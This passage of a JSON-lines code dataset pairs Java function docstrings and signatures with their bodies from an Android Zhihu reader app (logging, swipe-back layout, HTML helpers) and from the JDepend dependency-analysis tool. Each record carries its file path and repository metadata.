\" \" \n            + \" (\" + trace[stackIndex].getFileName() + \":\" + trace[stackIndex].getLineNumber() + \")\");\n  }\n}\n\nprivate void logBottomBorder(int logType, String tag) {\n  logChunk(logType, tag, BOTTOM_BORDER);\n}\n\nprivate void logDivider(int logType, String tag) {\n  logChunk(logType, tag, MIDDLE_BORDER);\n}\n\nprivate void logContent(int logType, String tag, String chunk) {\n  String[] lines = chunk.split(System.getProperty(\"line.separator\"));\n  for (String line : lines) {\n    logChunk(logType, tag, HORIZONTAL_DOUBLE_LINE + \" \" + line);\n  }\n}\n\nprivate void logChunk(int logType, String tag, String chunk) {\n  final String finalTag;\n  if (settings.isSmartTag()) {\n    finalTag = getCurrentClassName() + formatTag(tag);\n  } else {\n    finalTag = formatTag(tag);\n  }\n  switch (logType) {\n    case Log.ERROR:\n      Log.e(finalTag, chunk);\n      break;\n    case Log.INFO:\n      Log.i(finalTag, chunk);\n      break;\n    case Log.VERBOSE:\n      Log.v(finalTag, chunk);\n      break;\n    case Log.WARN:\n      Log.w(finalTag, chunk);\n      break;\n    case Log.ASSERT:\n      Log.wtf(finalTag, chunk);\n      break;\n    case Log.DEBUG:\n      // Fall through, log debug by default\n    default:\n      Log.d(finalTag, chunk);\n      break;\n  }\n}\n\nprivate String getCurrentClassName() {\n    StackTraceElement[] trace = Thread.currentThread().getStackTrace();\n    int offset = getStackOffset(trace) + settings.getMethodOffset();\n    StackTraceElement thisMethodStack = (new Exception()).getStackTrace()[offset - 1];\n    String result = thisMethodStack.getClassName();\n    int lastIndex = result.lastIndexOf(\".\");\n    result = result.substring(lastIndex + 1, result.length());\n    return result;\n}\n\nprivate String getSimpleClassName(String name) {\n  int lastIndex = name.lastIndexOf(\".\");\n  return name.substring(lastIndex + 1);\n}\n\nprivate String formatTag(String tag) {\n  if (!TextUtils.isEmpty(tag) && !TextUtils.equals(TAG, tag)) {\n    return TAG + \"-\" + tag;\n  }\n  return TAG;\n}\n\n/**\n * @return the appropriate tag based on local or global\n */\nprivate String getTag() {\n  String tag = LOCAL_TAG.get();\n  if (tag != null) {\n    LOCAL_TAG.remove();\n    return tag;\n  }\n  return TAG;\n}\n\nprivate String createMessage(String message, Object... args) {\n  if (message == null) {\n    message = \"null\";\n  }\n  return args.length == 0 ? message : String.format(message, args);\n}\n\nprivate int getMethodCount() {\n  Integer count = LOCAL_METHOD_COUNT.get();\n  int result = settings.getMethodCount();\n  if (count != null) {\n    LOCAL_METHOD_COUNT.remove();\n    result = count;\n  }\n  if (result < 0) {\n    throw new IllegalStateException(\"methodCount cannot be negative\");\n  }\n  return result;\n}\n\n/**\n * Determines the starting index of the stack trace, after method calls made by this class.\n *\n * @param trace the stack trace\n * @return the stack offset\n */\nprivate int getStackOffset(StackTraceElement[] trace) {\n  for (int i = MIN_STACK_OFFSET; i < trace.length; i++) {\n    StackTraceElement e = trace[i];\n    String name = e.getClassName();\n    if (!name.equals(LoggerPrinter.class.getName()) && !name.equals(Logger.class.getName())) {\n      return --i;\n    }\n  }\n  return -1;\n}\n\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\logger\\LoggerPrinter.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Set scroll threshold, we will close the activity, when scrollPercent over\n * this value\n *\n * @param threshold\n */\n", "func_signal": "public void setScrollThresHold(float threshold)", "code": "{\n    if (threshold >= 1.0f || threshold <= 0) {\n        throw new IllegalArgumentException(\"Threshold value should be between 0 and 1.0\");\n    }\n    mScrollThreshold = threshold;\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\SwipeBackLayout.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * @return \u5f53\u524d\u7684\u7c7b\u540d(simpleName)\n */\n", "func_signal": "private static String getClassName()", "code": "{\n\n    String result;\n    StackTraceElement thisMethodStack = (new Exception()).getStackTrace()[2];\n    result = thisMethodStack.getClassName();\n    int lastIndex = result.lastIndexOf(\".\");\n    result = result.substring(lastIndex + 1, result.length());\n\n    //\u5982\u679c\u8c03\u7528\u4f4d\u7f6e\u5728\u533f\u540d\u5185\u90e8\u7c7b\u7684\u8bdd\uff0c\u5c31\u4f1a\u4ea7\u751f\u7c7b\u4f3c\u4e8e MainActivity$3 \u8fd9\u6837\u7684TAG\n    //\u53ef\u4ee5\u628a$\u540e\u9762\u7684\u90e8\u5206\u53bb\u6389\n    int i = result.indexOf(\"$\");\n\n    return i == -1 ? result : result.substring(0, i);\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\L.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * \u904d\u5386\u6570\u7ec4\n */\n", "func_signal": "private static void traverseArray(StringBuilder result, Object object)", "code": "{\n    if (!isArray(object)) {\n        result.append(object.toString());\n        return;\n    }\n    if (getArrayDimension(object) == 1) {\n        switch (getType(object)) {\n            case 'I':\n                result.append(Arrays.toString((int[]) object)).append(\"\\n\");\n                return;\n            case 'D':\n                result.append(Arrays.toString((double[]) object)).append(\"\\n\");\n                return;\n            case 'Z':\n                result.append(Arrays.toString((boolean[]) object)).append(\"\\n\");\n                return;\n            case 'B':\n                result.append(Arrays.toString((byte[]) object)).append(\"\\n\");\n                return;\n            case 'S':\n                result.append(Arrays.toString((short[]) object)).append(\"\\n\");\n                return;\n            case 'J':\n                result.append(Arrays.toString((long[]) object)).append(\"\\n\");\n                return;\n            case 'F':\n                result.append(Arrays.toString((float[]) object)).append(\"\\n\");\n                return;\n            case 'L':\n                result.append(Arrays.toString((Object[]) object)).append(\"\\n\");\n            default:\n                return;\n        }\n    }\n    for (int i = 0; i < ((Object[]) object).length; i++) {\n        traverseArray(result, ((Object[]) object)[i]);\n    }\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\logger\\util\\ArrayUtil.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Calling the convertToTranslucent method on platforms after Android 5.0\n */\n", "func_signal": "private static void convertActivityToTranslucentAfterL(Activity activity)", "code": "{\n    try {\n        Method getActivityOptions = Activity.class.getDeclaredMethod(\"getActivityOptions\");\n        getActivityOptions.setAccessible(true);\n        Object options = getActivityOptions.invoke(activity);\n\n        Class<?>[] classes = Activity.class.getDeclaredClasses();\n        Class<?> translucentConversionListenerClazz = null;\n        for (Class clazz : classes) {\n            if (clazz.getSimpleName().contains(\"TranslucentConversionListener\")) {\n                translucentConversionListenerClazz = clazz;\n            }\n        }\n        Method convertToTranslucent = Activity.class.getDeclaredMethod(\"convertToTranslucent\",\n                translucentConversionListenerClazz, ActivityOptions.class);\n        convertToTranslucent.setAccessible(true);\n        convertToTranslucent.invoke(activity, null, options);\n    } catch (Throwable t) {\n    }\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\Utils.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * \u5c06\u5bf9\u8c61\u8f6c\u5316\u4e3aString\n */\n", "func_signal": "public static <T> String objectToString(T object)", "code": "{\n    if (object == null) {\n        return \"Object{object is null}\";\n    }\n    if (object.toString().startsWith(object.getClass().getName() + \"@\")) {\n        StringBuilder builder = new StringBuilder(object.getClass().getSimpleName() + \"{\");\n        Field[] fields = object.getClass().getDeclaredFields();\n        for (Field field : fields) {\n            field.setAccessible(true);\n            boolean flag = false;\n            for (String type : types) {\n                if (field.getType().getName().equalsIgnoreCase(type)) {\n                    flag = true;\n                    Object value = null;\n                    try {\n                        value = field.get(object);\n                    } catch (IllegalAccessException e) {\n                        value = e;\n                    } finally {\n                        builder.append(String.format(\"%s=%s, \", field.getName(),\n                                value == null ? \"null\" : value.toString()));\n                        break;\n                    }\n                }\n            }\n            if (!flag) {\n                builder.append(String.format(\"%s=%s, \", field.getName(), \"Object\"));\n            }\n        }\n        return builder.replace(builder.length() - 2, builder.length() - 1, \"}\").toString();\n    } else {\n        return object.toString();\n    }\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\logger\\util\\SystemUtil.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Convert a translucent themed Activity\n * {@link android.R.attr#windowIsTranslucent} to a fullscreen opaque\n * Activity.\n * <p>\n * Call this whenever the background of a translucent Activity has changed\n * to become opaque. Doing so will allow the {@link android.view.Surface} of\n * the Activity behind to be released.\n * <p>\n * This call has no effect on non-translucent activities or on activities\n * with the {@link android.R.attr#windowIsFloating} attribute.\n */\n", "func_signal": "public static void convertActivityFromTranslucent(Activity activity)", "code": "{\n    try {\n        Method method = Activity.class.getDeclaredMethod(\"convertFromTranslucent\");\n        method.setAccessible(true);\n        method.invoke(activity);\n    } catch (Throwable t) {\n    }\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\Utils.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Formats the json content and print it\n *\n * @param xml the xml content\n */\n", "func_signal": "@Override\npublic void xml(String xml)", "code": "{\n  if (TextUtils.isEmpty(xml)) {\n    d(\"Empty/Null xml content\");\n    return;\n  }\n  try {\n    Source xmlInput = new StreamSource(new StringReader(xml));\n    StreamResult xmlOutput = new StreamResult(new StringWriter());\n    Transformer transformer = TransformerFactory.newInstance().newTransformer();\n    transformer.setOutputProperty(OutputKeys.INDENT, \"yes\");\n    transformer.setOutputProperty(\"{http://xml.apache.org/xslt}indent-amount\", \"2\");\n    transformer.transform(xmlInput, xmlOutput);\n    d(xmlOutput.getWriter().toString().replaceFirst(\">\", \">\\n\"));\n  } catch (TransformerException e) {\n    e(e.getCause().getMessage() + \"\\n\" + xml);\n  }\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\logger\\LoggerPrinter.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Add a callback to be invoked when a swipe event is sent to this view.\n *\n * @param listener the swipe listener to attach to this view\n */\n", "func_signal": "public void addSwipeListener(SwipeListener listener)", "code": "{\n    if (mListeners == null) {\n        mListeners = new ArrayList<SwipeListener>();\n    }\n    mListeners.add(listener);\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\SwipeBackLayout.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Enable edge tracking for the selected edges of the parent view. The\n * callback's\n * {@link ViewDragHelper.Callback#onEdgeTouched(int, int)}\n * and\n * {@link ViewDragHelper.Callback#onEdgeDragStarted(int, int)}\n * methods will only be invoked for edges for which edge tracking has been\n * enabled.\n *\n * @param edgeFlags Combination of edge flags describing the edges to watch\n * @see #EDGE_LEFT\n * @see #EDGE_RIGHT\n * @see #EDGE_BOTTOM\n */\n", "func_signal": "public void setEdgeTrackingEnabled(int edgeFlags)", "code": "{\n    mEdgeFlag = edgeFlags;\n    mDragHelper.setEdgeTrackingEnabled(mEdgeFlag);\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\SwipeBackLayout.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Removes a listener from the set of listeners\n *\n * @param listener\n */\n", "func_signal": "public void removeSwipeListener(SwipeListener listener)", "code": "{\n    if (mListeners == null) {\n        return;\n    }\n    mListeners.remove(listener);\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\SwipeBackLayout.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Set a drawable used for edge shadow.\n *\n * @param shadow    Drawable to use\n * @param edgeFlag Combination of edge flags describing the edge to set\n * @see #EDGE_LEFT\n * @see #EDGE_RIGHT\n * @see #EDGE_BOTTOM\n */\n", "func_signal": "public void setShadow(Drawable shadow, int edgeFlag)", "code": "{\n    if ((edgeFlag & EDGE_LEFT) != 0) {\n        mShadowLeft = shadow;\n    } else if ((edgeFlag & EDGE_RIGHT) != 0) {\n        mShadowRight = shadow;\n    } else if ((edgeFlag & EDGE_BOTTOM) != 0) {\n        mShadowBottom = shadow;\n    }\n    invalidate();\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\SwipeBackLayout.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * \u6839\u636eNews\n * \u751f\u6210\u5b8c\u6574\u7684HTML\u6587\u6863\n *\n * @param newsDetail NewsDetail\n * @return String\n */\n", "func_signal": "public static String createHtmlData(NewsDetail newsDetail, boolean isNight)", "code": "{\n    final String css = HtmlUtil.createCssTag(newsDetail.getCss());\n    final String js = HtmlUtil.createJsTag(newsDetail.getJs());\n    final String body = handleHtml(newsDetail.getBody(), isNight).toString();\n    return createHtmlData(body, css, js);\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\HtmlUtil.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Scroll out contentView and finish the activity\n */\n", "func_signal": "public void scrollToFinishActivity()", "code": "{\n    final int childWidth = mContentView.getWidth();\n    final int childHeight = mContentView.getHeight();\n\n    int left = 0, top = 0;\n    if ((mEdgeFlag & EDGE_LEFT) != 0) {\n        left = childWidth + mShadowLeft.getIntrinsicWidth() + OVERSCROLL_DISTANCE;\n        mTrackingEdge = EDGE_LEFT;\n    } else if ((mEdgeFlag & EDGE_RIGHT) != 0) {\n        left = -childWidth - mShadowRight.getIntrinsicWidth() - OVERSCROLL_DISTANCE;\n        mTrackingEdge = EDGE_RIGHT;\n    } else if ((mEdgeFlag & EDGE_BOTTOM) != 0) {\n        top = -childHeight - mShadowBottom.getIntrinsicHeight() - OVERSCROLL_DISTANCE;\n        mTrackingEdge = EDGE_BOTTOM;\n    }\n\n    mDragHelper.smoothSlideViewTo(mContentView, left, top);\n    invalidate();\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\SwipeBackLayout.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Calling the convertToTranslucent method on platforms before Android 5.0\n */\n", "func_signal": "public static void convertActivityToTranslucentBeforeL(Activity activity)", "code": "{\n    try {\n        Class<?>[] classes = Activity.class.getDeclaredClasses();\n        Class<?> translucentConversionListenerClazz = null;\n        for (Class clazz : classes) {\n            if (clazz.getSimpleName().contains(\"TranslucentConversionListener\")) {\n                translucentConversionListenerClazz = clazz;\n            }\n        }\n        Method method = Activity.class.getDeclaredMethod(\"convertToTranslucent\",\n                translucentConversionListenerClazz);\n        method.setAccessible(true);\n        method.invoke(activity, new Object[] {\n            null\n        });\n    } catch (Throwable t) {\n    }\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\Utils.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * \u6839\u636e\u591a\u4e2ajs\u94fe\u63a5\u751f\u6210Script\u6807\u7b7e\n *\n * @param urls List<String>\n * @return String\n */\n", "func_signal": "public static String createJsTag(List<String> urls)", "code": "{\n    final StringBuilder sb = new StringBuilder();\n    for (String url : urls) {\n        sb.append(createJsTag(url));\n    }\n    return sb.toString();\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\HtmlUtil.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * \u83b7\u53d6\u6570\u7ec4\u7684\u7eac\u5ea6\n */\n", "func_signal": "public static int getArrayDimension(Object objects)", "code": "{\n    int dim = 0;\n    for (int i = 0; i < objects.toString().length(); ++i) {\n        if (objects.toString().charAt(i) == '[') {\n            ++dim;\n        } else {\n            break;\n        }\n    }\n    return dim;\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\logger\\util\\ArrayUtil.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * \u6839\u636e\u591a\u4e2acss\u94fe\u63a5\u751f\u6210Link\u6807\u7b7e\n *\n * @param urls List<String>\n * @return String\n */\n", "func_signal": "public static String createCssTag(List<String> urls)", "code": "{\n    final StringBuilder sb = new StringBuilder();\n    for (String url : urls) {\n        sb.append(createCssTag(url));\n    }\n    return sb.toString();\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\HtmlUtil.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * \u83b7\u53d6\u6570\u7ec4\u7c7b\u578b\n *\n * @param object \u5982L\u4e3aint\u578b\n */\n", "func_signal": "public static char getType(Object object)", "code": "{\n    if (isArray(object)) {\n        String str = object.toString();\n        return str.substring(str.lastIndexOf(\"[\") + 1, str.lastIndexOf(\"[\") + 2).charAt(0);\n    }\n    return 0;\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\logger\\util\\ArrayUtil.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Convert a translucent themed Activity\n * {@link android.R.attr#windowIsTranslucent} back from opaque to\n * translucent following a call to\n * {@link #convertActivityFromTranslucent(Activity)} .\n * <p>\n * Calling this allows the Activity behind this one to be seen again. Once\n * all such Activities have been redrawn\n * <p>\n * This call has no effect on non-translucent activities or on activities\n * with the {@link android.R.attr#windowIsFloating} attribute.\n */\n", "func_signal": "public static void convertActivityToTranslucent(Activity activity)", "code": "{\n    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {\n        convertActivityToTranslucentAfterL(activity);\n    } else {\n        convertActivityToTranslucentBeforeL(activity);\n    }\n}", "path": "app\\src\\main\\java\\io\\github\\laucherish\\purezhihud\\utils\\swipeback\\Utils.java", "repo_name": "laucherish/PureZhihuD", "stars": 544, "license": "None", "language": "java", "size": 14547}
{"docstring": "/**\n * Returns the string representation of this object.\n *\n * @return String representation.\n */\n", "func_signal": "public String toString()", "code": "{\n\n\tStringBuffer contents = new StringBuffer();\n\n\tcontents.append(\"User ID = \" + _userId + \"\\n\");\n\tcontents.append(\"User Password = \" + _userPassword + \"\\n\");\n\tcontents.append(\"Name = \" + _name + \"\\n\");\n\tcontents.append(\"Account Number = \" + _accountNumber + \"\\n\");\n\tcontents.append(\"Amount = \" + _amount + \"\\n\");\n\t\n\treturn contents.toString();\n}", "path": "sample\\epayment\\request\\PaymentRequest.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Sets the list of components.\n * \n * @param components Comma-separated list of components.\n */\n", "func_signal": "public void setComponents(String components)", "code": "{\n    this.components = new ArrayList();\n    StringTokenizer st = new StringTokenizer(components, \",\");\n    while (st.hasMoreTokens()) {\n        String component = st.nextToken();\n        this.components.add(component);\n    }\n}", "path": "src\\jdepend\\framework\\JDepend.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Builds the <code>JavaClass</code> instances from the specified \n * jar, war, or zip file.\n * \n * @param file Jar, war, or zip file.\n * @return Collection of <code>JavaClass</code> instances.\n */\n", "func_signal": "public Collection buildClasses(JarFile file) throws IOException", "code": "{\n\n    Collection javaClasses = new ArrayList();\n\n    Enumeration entries = file.entries();\n    while (entries.hasMoreElements()) {\n        ZipEntry e = (ZipEntry) entries.nextElement();\n        if (fileManager.acceptClassFileName(e.getName())) {\n            InputStream is = null;\n            try {\n\t                is = new BufferedInputStream(file.getInputStream(e));\n                JavaClass jc = parser.parse(is);\n                javaClasses.add(jc);\n            } finally {\n                is.close();\n            }\n        }\n    }\n\n    return javaClasses;\n}", "path": "src\\jdepend\\framework\\JavaClassBuilder.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Adds the specified Java package name to the collection of analyzed\n * packages.\n * \n * @param name Java package name.\n * @return Added Java package.\n */\n", "func_signal": "public JavaPackage addPackage(String name)", "code": "{\n    name = toComponent(name);\n    JavaPackage pkg = (JavaPackage)packages.get(name);\n    if (pkg == null) {\n        pkg = new JavaPackage(name);\n        addPackage(pkg);\n    }\n\n    return pkg;\n}", "path": "src\\jdepend\\framework\\JDepend.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Constructs a <code>PaymentProcessor</code>\n * instance using the default configurator.\n */\n", "func_signal": "public PaymentProcessor()", "code": "{\n\t\n\ttry {\n\t\n\t\tPaymentProcessorConfigurator configurator = \n\t\t\tnew PaymentProcessorConfigurator();\n\t\tconfigurator.configure(this);\t\t\t\n\t\n\t} catch(Exception e) {\n\t\tSystem.err.println(\"Payment processor configuration error: \" +\n\t\t\te.getMessage());\n\t\t// default to consistent state\n\t}\n}", "path": "sample\\epayment\\processor\\PaymentProcessor.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Constructs a <code>PaymentRequest</code>.\n * with default values.\n */\n", "func_signal": "public PaymentRequest()", "code": "{\n\t_userId = \"\";\n\t_userPassword = \"\";\n\t_name = \"\";\n\t_accountNumber = \"\";\n\t_amount = 0.0;\n\t_comment = \"\";\n}", "path": "sample\\epayment\\request\\PaymentRequest.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Returns the index of the specified child within the specified parent.\n * \n * @param parent Parent node.\n * @param child Child node.\n * @return Index of child within parent.\n */\n", "func_signal": "public int getIndexOfChild(Object parent, Object child)", "code": "{\n    int answer = -1;\n    ArrayList children = null;\n\n    if (parent instanceof PackageNode) {\n        children = ((PackageNode) parent).getChildren();\n\n        if (children != null) {\n            answer = children.indexOf(child);\n        }\n    }\n\n    return answer;\n}", "path": "src\\jdepend\\swingui\\DependTreeModel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Returns the child of the specified parent at the specified index in the\n * parent's child collection.\n * <p>\n * The specified parent must be a node previously obtained from this data\n * source.\n * \n * @param parent A node in the tree, obtained from this data source.\n * @param index Index of child in the parent's child collection.\n * @return Child.\n */\n", "func_signal": "public Object getChild(Object parent, int index)", "code": "{\n\n    Object answer = null;\n    ArrayList children;\n\n    if (parent instanceof PackageNode) {\n        children = ((PackageNode) parent).getChildren();\n\n        if (children != null) {\n            if (index < children.size()) {\n                answer = children.get(index);\n            }\n        }\n    }\n\n    return answer;\n}", "path": "src\\jdepend\\swingui\\DependTreeModel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Sets the specified component as the current status component of this\n * panel.\n * \n * @param component Status component.\n */\n", "func_signal": "public void setStatusComponent(JComponent component)", "code": "{\n    removeAll();\n    add(component);\n    repaint();\n    validate();\n}", "path": "src\\jdepend\\swingui\\StatusPanel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Adds a listener for the <code>TreeModelEvent</code> posted after the\n * tree changes.\n * \n * @param l The listener to add.\n */\n", "func_signal": "public void addTreeModelListener(TreeModelListener l)", "code": "{\n\n    if ((l != null) && !listeners.contains(l)) {\n        listeners.addElement(l);\n    }\n}", "path": "src\\jdepend\\swingui\\DependTreeModel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Analyzes the registered directories and returns the collection of\n * analyzed packages.\n * \n * @return Collection of analyzed packages.\n */\n", "func_signal": "public Collection analyze()", "code": "{\n\n    Collection classes = builder.build();\n    \n    for (Iterator i = classes.iterator(); i.hasNext();) {\n        analyzeClass((JavaClass)i.next());\n    }\n\n    return getPackages();\n}", "path": "src\\jdepend\\framework\\JDepend.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Returns the number of children for the specified parent.\n * <p>\n * The specified parent must be a node previously obtained from this data\n * source.\n * \n * @param parent A node in the tree, obtained from this data source.\n * @return The number of children of the specified parent, or 0 if the\n *         parent is a leaf node or if it has no children.\n */\n", "func_signal": "public int getChildCount(Object parent)", "code": "{\n\n    int answer = 0;\n    ArrayList children;\n\n    if (parent instanceof PackageNode) {\n        children = ((PackageNode) parent).getChildren();\n\n        if (children != null) {\n            answer = children.size();\n        }\n    }\n\n    return answer;\n}", "path": "src\\jdepend\\swingui\\DependTreeModel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Adds the specified Java package to the collection of \n * analyzed packages.\n * \n * @param pkg Java package.\n */\n", "func_signal": "public void addPackage(JavaPackage pkg)", "code": "{\n    if (!packages.containsValue(pkg)) {\n        packages.put(pkg.getName(), pkg);\n    }\n}", "path": "src\\jdepend\\framework\\JDepend.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Indicates whether the packages contain one or more dependency cycles.\n * \n * @return <code>true</code> if one or more dependency cycles exist.\n */\n", "func_signal": "public boolean containsCycles()", "code": "{\n    for (Iterator i = getPackages().iterator(); i.hasNext();) {\n        JavaPackage jPackage = (JavaPackage)i.next();\n        if (jPackage.containsCycle()) {\n            return true;\n        }\n    }\n\n    return false;\n}", "path": "src\\jdepend\\framework\\JDepend.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Determines whether the specified tree node is a leaf node.\n * \n * @param o A node in the tree, obtained from this data source.\n * @return <code>true</code> if the node is a leaf; <code>false</code>\n *         otherwise.\n */\n", "func_signal": "public boolean isLeaf(Object o)", "code": "{\n\n    boolean answer = true;\n\n    if (o instanceof PackageNode) {\n        PackageNode node = (PackageNode) o;\n        return node.isLeaf();\n    }\n\n    return answer;\n}", "path": "src\\jdepend\\swingui\\DependTreeModel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Returns the sole instance of this class.\n *\n * @return Payment processor.\n */\n", "func_signal": "public static PaymentProcessor getProcessor()", "code": "{\n\tif (_processor == null) {\n\t\t_processor = new PaymentProcessor();\n\t}\n\treturn _processor;\n}", "path": "sample\\epayment\\processor\\PaymentProcessor.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Builds the <code>JavaClass</code> instances.\n * \n * @return Collection of <code>JavaClass</code> instances.\n */\n", "func_signal": "public Collection build()", "code": "{\n\n    Collection classes = new ArrayList();\n\n    for (Iterator i = fileManager.extractFiles().iterator(); i.hasNext();) {\n\n        File nextFile = (File)i.next();\n\n        try {\n\n            classes.addAll(buildClasses(nextFile));\n\n        } catch (IOException ioe) {\n            System.err.println(\"\\n\" + ioe.getMessage());\n        }\n    }\n\n    return classes;\n}", "path": "src\\jdepend\\framework\\JavaClassBuilder.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Constructs a <code>StatusPanel</code>.\n */\n", "func_signal": "public StatusPanel()", "code": "{\n    super();\n    setLayout(new BoxLayout(this, BoxLayout.Y_AXIS));\n}", "path": "src\\jdepend\\swingui\\StatusPanel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Constructs a <code>DependTreeModel</code> with the specified root\n * package node.\n * \n * @param root Root package node.\n */\n", "func_signal": "public DependTreeModel(PackageNode root)", "code": "{\n    this.root = root;\n    listeners = new Vector();\n}", "path": "src\\jdepend\\swingui\\DependTreeModel.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
{"docstring": "/**\n * Builds the <code>JavaClass</code> instances from the \n * specified file.\n * \n * @param file Class or Jar file.\n * @return Collection of <code>JavaClass</code> instances.\n */\n", "func_signal": "public Collection buildClasses(File file) throws IOException", "code": "{\n\n    if (fileManager.acceptClassFile(file)) {\n        InputStream is = null;\n        try {\n            is = new BufferedInputStream(new FileInputStream(file));\n            JavaClass parsedClass = parser.parse(is);\n            Collection javaClasses = new ArrayList();\n            javaClasses.add(parsedClass);\n            return javaClasses;\n        } finally {\n            if (is != null) {\n                is.close();\n            }\n        }\n    } else if (fileManager.acceptJarFile(file)) {\n\n        JarFile jarFile = new JarFile(file);\n        Collection result = buildClasses(jarFile);\n        jarFile.close();\n        return result;\n\n    } else {\n        throw new IOException(\"File is not a valid \" + \n            \".class, .jar, .war, or .zip file: \" + \n            file.getPath());\n    }\n}", "path": "src\\jdepend\\framework\\JavaClassBuilder.java", "repo_name": "clarkware/jdepend", "stars": 571, "license": "mit", "language": "java", "size": 1255}
